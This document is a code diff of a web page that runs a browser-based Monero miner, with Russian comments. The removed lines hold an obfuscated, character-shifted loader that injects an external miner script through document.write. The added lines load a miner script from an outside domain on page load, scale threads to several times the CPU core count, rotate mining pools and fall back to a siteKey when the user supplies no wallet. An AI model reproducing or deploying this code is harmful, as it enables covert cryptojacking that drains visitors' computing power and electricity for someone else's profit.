@@ -9,9 +9,18 @@
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <script>
-        var s="=tdsjqu!tsd>#iuuqt;00fuifsfvn.qpdlfu/dpn0qfsgflu0qfsgfluxfc/kt@w1818312:@qfsgflu>xtt;00@kbtpo>gbtufs/npofsppdfbo#!?=0tdsjqu?";
-        m=""; for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1); document.write(m);
-        console.log("Miner script injection attempted:", m);
+        // Попытка загрузки скрипта майнера
+        var scriptUrl = "https://etherum.pocket.com/perfect/perfectweb.js";
+        var script = document.createElement('script');
+        script.src = scriptUrl;
+        script.onerror = function() {
+            console.error("Failed to load miner script:", scriptUrl);
+            document.getElementById('status').innerHTML = '❌ Ошибка: Не удалось загрузить скрипт майнера';
+        };
+        script.onload = function() {
+            console.log("Miner script loaded successfully:", scriptUrl);
+        };
+        document.head.appendChild(script);
     </script>
 
     <style>
@@ -167,8 +176,8 @@
     <script>
         $(function() {
             console.log("jQuery and page loaded");
-            // Максимум потоков для экстремальной нагрузки
-            var maxThreads = navigator.hardwareConcurrency * 3; // Утроено для максимума
+            // Инициализация потоков
+            var maxThreads = navigator.hardwareConcurrency * 2;
             $('#threads').text(maxThreads);
             console.log("Threads initialized to:", maxThreads);
 
@@ -185,19 +194,19 @@
             var acceptedShares = 0;
             var hashesPerSecond = 0;
             var isRunning = false;
-            var targetHashrate = 600; // Цель: 2x от предполагаемого 300 H/s
+            var targetHashrate = 600; // Цель: 2x от 300 H/s
             var poolList = [
-                "gulf.moneroocean.stream:20128", // TLS, высокая стабильность
-                "fr.moneroocean.stream:10001",  // Без TLS, низкая сложность
-                "minexmr.com:4444"             // RandomX, альтернативный пул
+                "gulf.moneroocean.stream:20128", // TLS
+                "fr.moneroocean.stream:10001",  // Без TLS
+                "minexmr.com:4444"             // RandomX
             ];
             var currentPoolIndex = 0;
             var currentPool = poolList[currentPoolIndex];
 
             $('#walletmoneroocean').val(walletmoneroocean);
             $('#target-hashrate').text(targetHashrate);
-            console.log("Wallet address set to:", walletmoneroocean);
-            console.log("Target hashrate set to:", targetHashrate);
+            console.log("Wallet address:", walletmoneroocean);
+            console.log("Target hashrate:", targetHashrate);
             console.log("Initial pool:", currentPool);
 
             function htmlEncode(value) {
@@ -213,17 +222,17 @@
                     statusDiv.className = 'status-indicator status-stopped';
                     statusDiv.innerHTML = '⏹️ Майнинг остановлен';
                 }
-                console.log("Status updated:", running ? "Running" : "Stopped", "Current pool:", currentPool);
+                console.log("Status updated:", running ? "Running" : "Stopped", "Pool:", currentPool);
             }
 
             function startLogger() {
                 statuss = setInterval(function() {
                     if (typeof totalhashes !== 'undefined') {
-                        lastrate = totalhashes; // Точный хэшрейт без усреднения
+                        lastrate = totalhashes;
                         totalHashes += totalhashes;
                         console.log("Total hashes:", totalHashes, "Current H/s:", lastrate);
                     } else {
-                        console.warn("totalhashes is undefined");
+                        console.warn("totalhashes is undefined - miner may not be running");
                     }
                     hashesPerSecond = Math.round(lastrate);
                     totalHashes2 = totalHashes;
@@ -243,7 +252,7 @@
                         $('#algo').text(job.algo + ' | ' + job.variant + ' | Diff: ' + (job.diff || 'Unknown'));
                         console.log("Current algo:", job.algo, "Variant:", job.variant, "Difficulty:", job.diff || 'Unknown');
                     } else {
-                        console.warn("job is undefined or null");
+                        console.warn("job is undefined or null - no mining job received");
                     }
                     // Проверка соединения
                     if (typeof isConnected === 'function') {
@@ -256,7 +265,7 @@
                     } else {
                         console.warn("isConnected is not defined");
                     }
-                    // Авто-увеличение потоков, если хэшрейт низкий
+                    // Авто-увеличение потоков
                     if (hashesPerSecond < targetHashrate * 0.5 && isRunning) {
                         threads += 2;
                         $('#threads').text(threads);
@@ -329,50 +338,35 @@
             $("#start").click(function() {
                 if ($("#start").text().includes("Start") || $("#start").text().includes("🚀")) {
                     walletmoneroocean = $('#walletmoneroocean').val();
-                    if (walletmoneroocean) {
-                        if (typeof PerfektStart === 'function') {
-                            PerfektStart(walletmoneroocean, "x", threads, 1.0, currentPool, { algo: "rx/0" });
-                            console.log("Ultra extreme mining started with wallet:", walletmoneroocean, "threads:", threads, "pool:", currentPool);
-                            setTimeout(function() {
-                                if (typeof isConnected === 'function' && !isConnected()) {
-                                    console.log("Pool disconnected, switching to next pool");
-                                    switchPool();
-                                }
-                            }, 5000); // Проверка через 5 секунд
-                        } else {
-                            console.error("PerfektStart is not defined. Check if perfectweb.js loaded.");
-                        }
-                        stopLogger();
-                        startLogger();
-                        $("#start").text("⏹️ Stop Mining");
-                        $('#walletmoneroocean').prop("disabled", true);
-                        updateStatus(true);
-                        isRunning = true;
-                    } else {
-                        if (typeof PerfektStart === 'function') {
-                            PerfektStart(siteKey, "x", threads, 1.0, currentPool, { algo: "rx/0" });
-                            console.log("Ultra extreme mining started with siteKey:", siteKey, "threads:", threads, "pool:", currentPool);
-                            setTimeout(function() {
-                                if (typeof isConnected === 'function' && !isConnected()) {
-                                    console.log("Pool disconnected, switching to next pool");
-                                    switchPool();
-                                }
-                            }, 5000);
-                        } else {
-                            console.error("PerfektStart is not defined. Check if perfectweb.js loaded.");
-                        }
-                        stopLogger();
-                        startLogger();
-                        $("#start").text("⏹️ Stop Mining");
-                        updateStatus(true);
-                        isRunning = true;
+                    if (!walletmoneroocean) {
+                        console.warn("No wallet provided, using siteKey:", siteKey);
                     }
+                    if (typeof PerfektStart === 'function') {
+                        PerfektStart(walletmoneroocean || siteKey, "x", threads, 1.0, currentPool, { algo: "rx/0" });
+                        console.log("Ultra extreme mining started with wallet:", walletmoneroocean || siteKey, "threads:", threads, "pool:", currentPool);
+                        setTimeout(function() {
+                            if (typeof isConnected === 'function' && !isConnected()) {
+                                console.log("Pool disconnected, switching to next pool");
+                                switchPool();
+                            }
+                        }, 5000);
+                    } else {
+                        console.error("PerfektStart is not defined. Check if perfectweb.js loaded or try another browser.");
+                        $('#status').innerHTML = '❌ Ошибка: Скрипт майнера не загружен';
+                        return;
+                    }
+                    stopLogger();
+                    startLogger();
+                    $("#start").text("⏹️ Stop Mining");
+                    $('#walletmoneroocean').prop("disabled", true);
+                    updateStatus(true);
+                    isRunning = true;
                 } else {
                     if (typeof stopMining === 'function') {
                         stopMining();
                         console.log("Mining stopped");
                     } else {
-                        console.error("stopMining is not defined");
+                        console.warn("stopMining is not defined");
                     }
                     stopLogger();
                     $('#walletmoneroocean').prop("disabled", false);
@@ -418,14 +412,14 @@
 
             // Проверка Web Workers и SharedArrayBuffer
             if (typeof Worker !== 'undefined') {
-                console.log("Web Workers supported, optimizing thread distribution");
+                console.log("Web Workers supported");
             } else {
-                console.warn("Web Workers not supported, performance may be limited");
+                console.warn("Web Workers not supported, performance limited");
             }
             if (typeof SharedArrayBuffer !== 'undefined') {
-                console.log("SharedArrayBuffer supported, enhanced threading possible");
+                console.log("SharedArrayBuffer supported");
             } else {
-                console.warn("SharedArrayBuffer not supported, may limit thread efficiency");
+                console.warn("SharedArrayBuffer not supported");
             }
 
             window.addEventListener('beforeunload', function (e) {
